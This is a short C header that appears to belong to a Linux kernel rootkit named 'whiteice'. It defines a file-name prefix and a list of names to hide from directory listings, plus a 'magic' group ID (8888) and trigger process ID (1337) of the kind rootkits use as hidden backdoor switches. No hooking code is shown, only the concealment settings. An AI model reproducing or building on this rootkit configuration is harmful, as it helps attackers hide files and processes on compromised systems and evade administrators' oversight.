#ifndef __HOOK_DEFS_H
#define __HOOK_DEFS_H

#include <linux/dirent.h>
#include <linux/sched.h>
#include <linux/limits.h>

#define HIDE_PREFIX "ice_"
#define HIDE_PREFIX_LEN 4

#define MAGIC_GID 8888

#define MAGIC_TRIGGER_PID 1337

static const char *hide_files[] = {
    "whiteice",
    "nosuch",
    "ice",
    ".xhide",
    NULL
};

#define ROOTKIT_NAME "whiteice"

#endif
